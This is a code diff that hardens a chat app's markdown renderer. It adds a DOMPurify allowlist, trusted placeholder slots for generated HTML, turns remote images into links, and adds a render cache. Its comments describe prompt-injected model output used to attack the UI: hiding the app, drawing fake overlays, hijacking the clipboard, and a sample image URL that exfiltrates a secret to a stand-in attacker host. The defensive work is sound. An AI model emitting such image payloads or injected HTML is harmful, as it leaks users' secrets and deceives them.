@@ -6,52 +6,102 @@ import {
   type TokenizerExtension,
   type RendererExtension,
 } from 'marked';
-import hljs from 'highlight.js';
+import hljs from './highlighter';
 import { mathRenderer, shouldExtractAsMath, isValidLatex } from './mathRenderer';
 
-// Custom renderer for code blocks with syntax highlighting
+/**
+ * Candidates for fences without a language tag. `highlightAuto` runs every
+ * candidate grammar over the text: the full build's 192 grammars cost ~28 ms
+ * for 30 lines, this subset ~2 ms.
+ */
+const AUTO_DETECT_LANGUAGES = [
+  'bash',
+  'javascript',
+  'typescript',
+  'json',
+  'python',
+  'xml',
+  'css',
+  'sql',
+  'yaml',
+  'markdown',
+  'diff',
+  'java',
+  'c',
+  'cpp',
+  'go',
+  'rust',
+];
+
+/** Auto-detection costs ~3 ms per KB even with the subset; bigger fences are usually logs. */
+const AUTO_DETECT_MAX_CHARS = 3000;
+
+function highlightCode(text: string, lang: string | undefined): string {
+  try {
+    if (lang) {
+      // An unknown tag (`log`, `output`, `console`) still says "not code worth guessing"
+      return hljs.getLanguage(lang)
+        ? hljs.highlight(text, { language: lang }).value
+        : escapeHtml(text);
+    }
+    if (text.length > AUTO_DETECT_MAX_CHARS) return escapeHtml(text);
+    return hljs.highlightAuto(text, AUTO_DETECT_LANGUAGES).value;
+  } catch {
+    return escapeHtml(text);
+  }
+}
+
+// ============================================================================
+// Trusted slots
+// ============================================================================
+
+/**
+ * HTML we generate ourselves (code blocks with the copy button, KaTeX output,
+ * task checkboxes) never meets the sanitizer. The renderers park it here and
+ * emit an empty placeholder element; DOMPurify then sees only model-authored
+ * HTML, and `renderUncached` swaps the placeholders back afterwards. KaTeX
+ * needs inline `style` and the copy button needs `class` / `data-code`, both of
+ * which the allowlist refuses to model HTML.
+ */
+interface SlotState {
+  token: string;
+  html: string[];
+}
+
+let activeSlots: SlotState | null = null;
+
+function newSlotToken(): string {
+  // Not randomUUID: it needs a secure context, and server mode is reachable
+  // over plain http on a LAN.
+  const bytes = crypto.getRandomValues(new Uint8Array(8));
+  return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
+}
+
+function trustedSlot(html: string, tag: 'div' | 'span'): string {
+  if (!activeSlots) throw new Error('markdown parsed outside renderMarkdownSafe');
+  const index = activeSlots.html.push(html) - 1;
+  return `<${tag} data-md-slot="${activeSlots.token}-${index}"></${tag}>`;
+}
+
 const renderer = new marked.Renderer();
 
 renderer.code = ({ text, lang }: Tokens.Code) => {
-  // Apply syntax highlighting
-  let highlighted: string;
-  if (lang && hljs.getLanguage(lang)) {
-    try {
-      highlighted = hljs.highlight(text, { language: lang }).value;
-    } catch {
-      highlighted = escapeHtml(text);
-    }
-  } else {
-    // Auto-detect language if not specified
-    try {
-      highlighted = hljs.highlightAuto(text).value;
-    } catch {
-      highlighted = escapeHtml(text);
-    }
-  }
-
-  // Build element tree using DOM APIs for safe escaping
-  const wrapper = document.createElement('div');
-  wrapper.className = 'code-block-container';
-
-  const copyBtn = document.createElement('button');
-  copyBtn.className = 'code-copy-button';
-  copyBtn.type = 'button';
-  copyBtn.setAttribute('aria-label', 'Copy code');
-  copyBtn.textContent = '📋';
-  copyBtn.dataset.code = text; // DOM handles escaping automatically
-
-  const pre = document.createElement('pre');
-  const code = document.createElement('code');
-  if (lang) code.className = `language-${lang}`;
-  code.innerHTML = highlighted; // Already safe from hljs
-
-  pre.appendChild(code);
-  wrapper.appendChild(copyBtn);
-  wrapper.appendChild(pre);
-
-  return wrapper.outerHTML;
+  // marked passes the whole info string; only its first word names the language
+  const language = lang?.match(/^\S+/)?.[0];
+  const highlighted = highlightCode(text, language);
+  const codeClass = language ? ` class="language-${escapeHtml(language)}"` : '';
+  return trustedSlot(
+    '<div class="code-block-container">' +
+      `<button class="code-copy-button" type="button" aria-label="Copy code" data-code="${escapeHtml(text)}">📋</button>` +
+      `<pre><code${codeClass}>${highlighted}</code></pre>` +
+      '</div>',
+    'div'
+  );
 };
+
+// A checkbox can sit inside a <p> in loose lists, so its placeholder is inline
+renderer.checkbox = ({ checked }: Tokens.Checkbox) =>
+  trustedSlot(`<input type="checkbox" disabled${checked ? ' checked' : ''}>`, 'span') + ' ';
 
 // ============================================================================
 // Thinking Extension for marked
@@ -77,16 +127,16 @@ const thinkingExtension: TokenizerExtension & RendererExtension = {
       return {
         type: 'thinking',
         raw: match[0],
-        content: match[1],
+        // Lexed by the instance that is parsing, so Disable Math holds inside
+        // and reference links resolve against the whole message
+        tokens: this.lexer.blockTokens(match[1], []),
       };
     }
     return undefined;
   },
 
   renderer(token) {
-    // Parse inner content as markdown, then wrap in thinking tag
-    const inner = marked.parse((token as unknown as { content: string }).content) as string;
-    return `<thinking>${inner}</thinking>`;
+    return `<thinking>${this.parser.parse(token.tokens ?? [])}</thinking>`;
   },
 };
 
@@ -170,7 +220,10 @@ const blockMathExtension: TokenizerExtension & RendererExtension = {
   },
 
   renderer(token) {
-    return mathRenderer.renderDisplay((token as unknown as { latex: string }).latex);
+    return trustedSlot(
+      mathRenderer.renderDisplay((token as unknown as { latex: string }).latex),
+      'div'
+    );
   },
 };
 
@@ -242,7 +295,10 @@ const inlineMathExtension: TokenizerExtension & RendererExtension = {
   },
 
   renderer(token) {
-    return mathRenderer.renderInline((token as unknown as { latex: string }).latex);
+    return trustedSlot(
+      mathRenderer.renderInline((token as unknown as { latex: string }).latex),
+      'span'
+    );
   },
 };
 
@@ -262,32 +318,174 @@ const markedNoMath = new Marked({
   extensions: [thinkingExtension],
 });
 
+// ============================================================================
+// Sanitizer
+// ============================================================================
+
 /**
- * Parse markdown to HTML using marked library (with syntax highlighting and math)
+ * Model output, including prompt-injected tool and web content, may only use
+ * markdown's own vocabulary plus inline formatting. No `style` (one
+ * `<style>*{display:none}</style>` hides the app), no form controls, no media
+ * or SVG that fetch on their own, and no classes except `citation-link`: the
+ * bundle's Tailwind utilities would let `class="fixed inset-0 z-50"` draw a
+ * fake overlay, and a forged `code-copy-button` would hijack the clipboard.
  */
-export function parseMarkdown(content: string): string {
-  return marked.parse(content) as string;
+const SANITIZE_CONFIG = {
+  ALLOWED_TAGS: (
+    'a abbr b blockquote br caption cite code col colgroup dd del details dfn div dl dt em ' +
+    'figcaption figure h1 h2 h3 h4 h5 h6 hr i img ins kbd li mark ol p pre q rp rt ruby s ' +
+    'samp small span strong sub summary sup table tbody td tfoot th thead time tr u ul var ' +
+    'wbr thinking'
+  ).split(' '),
+  ALLOWED_ATTR: (
+    'href title alt src colspan rowspan align start reversed open class lang dir datetime ' +
+    'data-cited data-md-slot'
+  ).split(' '),
+  ALLOW_DATA_ATTR: false,
+};
+
+const ALLOWED_CLASSES = new Set(['citation-link']);
+
+/**
+ * Remote images would load on render, which is the classic exfiltration
+ * channel (`![](https://attacker/?d=SECRET)`). They become a link the user can
+ * choose to open; inline `data:image/…` stays an image.
+ */
+function replaceRemoteImage(img: Element): void {
+  const src = img.getAttribute('src') ?? '';
+  if (/^data:image\//i.test(src)) return;
+
+  const doc = img.ownerDocument;
+  const alt = img.getAttribute('alt')?.trim() || 'image';
+  let host = '';
+  try {
+    host = new URL(src, location.href).host;
+  } catch {
+    // Label without a host
+  }
+  const label = `🖼 ${alt}${src && host ? ` (${host})` : ''}`;
+
+  // No src left (DOMPurify dropped a javascript: URL): nothing to link to
+  if (!src) {
+    img.replaceWith(doc.createTextNode(label));
+    return;
+  }
+  // Inside a link (README badges): a nested <a> would break the outer link
+  if (img.parentElement?.closest('a')) {
+    const span = doc.createElement('span');
+    span.textContent = label;
+    img.replaceWith(span);
+    return;
+  }
+  const link = doc.createElement('a');
+  link.setAttribute('href', src);
+  link.setAttribute('target', '_blank');
+  link.setAttribute('rel', 'noopener noreferrer');
+  link.textContent = label;
+  img.replaceWith(link);
+}
+
+// Registered on the default instance, which only this module uses. Removing
+// first keeps HMR from stacking a second copy.
+DOMPurify.removeHooks('uponSanitizeAttribute');
+DOMPurify.removeHooks('afterSanitizeAttributes');
+
+DOMPurify.addHook('uponSanitizeAttribute', (_node, event) => {
+  if (event.attrName === 'class') {
+    const kept = event.attrValue.split(/\s+/).filter(name => ALLOWED_CLASSES.has(name));
+    if (kept.length > 0) event.attrValue = kept.join(' ');
+    else event.keepAttr = false;
+  } else if (event.attrName === 'data-md-slot') {
+    // Only placeholders from this render carry the token; forged ones are dropped
+    const token = activeSlots?.token;
+    if (!token || !new RegExp(`^${token}-\\d+$`).test(event.attrValue)) event.keepAttr = false;
+  }
+});
+
+DOMPurify.addHook('afterSanitizeAttributes', node => {
+  if (node.nodeName === 'A' && node.hasAttribute('href')) {
+    // Links open in a new tab instead of replacing the app
+    node.setAttribute('target', '_blank');
+    node.setAttribute('rel', 'noopener noreferrer');
+  } else if (node.nodeName === 'IMG') {
+    replaceRemoteImage(node);
+  }
+});
+
+function renderUncached(content: string, disableMath: boolean): string {
+  const slots: SlotState = { token: newSlotToken(), html: [] };
+  activeSlots = slots;
+  try {
+    const parsed = (disableMath ? markedNoMath : marked).parse(content) as string;
+    const clean = DOMPurify.sanitize(parsed, SANITIZE_CONFIG);
+    if (slots.html.length === 0) return clean;
+    const placeholder = new RegExp(`<(div|span) data-md-slot="${slots.token}-(\\d+)"></\\1>`, 'g');
+    // A replacer function: a replacement string would expand `$&` / `` $` ``
+    // found in highlighted shell code
+    return clean.replace(placeholder, (_match, _tag, index: string) => slots.html[+index] ?? '');
+  } finally {
+    activeSlots = null;
+  }
+}
+
+// LRU of rendered HTML. Messages remount often (virtualization placeholders,
+// focus-mode toggles, streaming → final bubble), and a parse costs marked +
+// hljs + KaTeX + DOMPurify. Map iteration order doubles as recency order.
+const RENDER_CACHE_MAX_ENTRIES = 200;
+const RENDER_CACHE_MAX_CHARS = 4_000_000;
+const renderCache = new Map<string, string>();
+let renderCacheChars = 0;
+
+function cacheGet(key: string): string | undefined {
+  const html = renderCache.get(key);
+  if (html !== undefined) {
+    renderCache.delete(key);
+    renderCache.set(key, html);
+  }
+  return html;
+}
+
+function cacheSet(key: string, html: string): void {
+  if (key.length > RENDER_CACHE_MAX_CHARS) return;
+  renderCache.set(key, html);
+  renderCacheChars += key.length;
+  while (renderCache.size > RENDER_CACHE_MAX_ENTRIES || renderCacheChars > RENDER_CACHE_MAX_CHARS) {
+    const oldest = renderCache.keys().next().value as string;
+    renderCache.delete(oldest);
+    renderCacheChars -= oldest.length;
+  }
+}
+
+/** Drop every cached render. Tests use it to count real parses. */
+export function clearMarkdownCache(): void {
+  renderCache.clear();
+  renderCacheChars = 0;
+}
+
+/** Test-only: the number of cached renders. */
+export function markdownCacheSize(): number {
+  return renderCache.size;
 }
 
 /**
- * Sanitize HTML using DOMPurify to prevent XSS attacks
+ * Markdown to sanitized HTML: marked (with hljs and math), then DOMPurify.
+ * Math is handled by marked extensions, so code blocks are protected automatically.
+ * Results are cached by input; the renderer config never changes at runtime.
+ * `cache: false` still reads the cache but doesn't store: a streaming reply
+ * renders a new prefix of itself every flush, and storing each one would push
+ * every finished message out of the LRU.
  */
-export function sanitizeHtml(html: string): string {
-  return DOMPurify.sanitize(html, {
-    ADD_ATTR: ['data-code'], // Allow data-code attribute for copy button
-    ADD_TAGS: ['thinking'], // Allow <thinking> tag for models that output thinking in text
-  });
-}
+export function renderMarkdownSafe(
+  content: string,
+  options?: { disableMath?: boolean; cache?: boolean }
+): string {
+  const key = (options?.disableMath ? '0' : '1') + content;
+  const cached = cacheGet(key);
+  if (cached !== undefined) return cached;
 
-/**
- * Combined markdown parsing (with hljs and math) and sanitization.
- * Math is now handled by marked extensions, so code blocks are protected automatically.
- */
-export function renderMarkdownSafe(content: string, options?: { disableMath?: boolean }): string {
-  const html = options?.disableMath
-    ? (markedNoMath.parse(content) as string)
-    : parseMarkdown(content);
-  return sanitizeHtml(html);
+  const html = renderUncached(content, options?.disableMath === true);
+  if (options?.cache !== false) cacheSet(key, html);
+  return html;
 }
 
 export function escapeHtml(text: string): string {
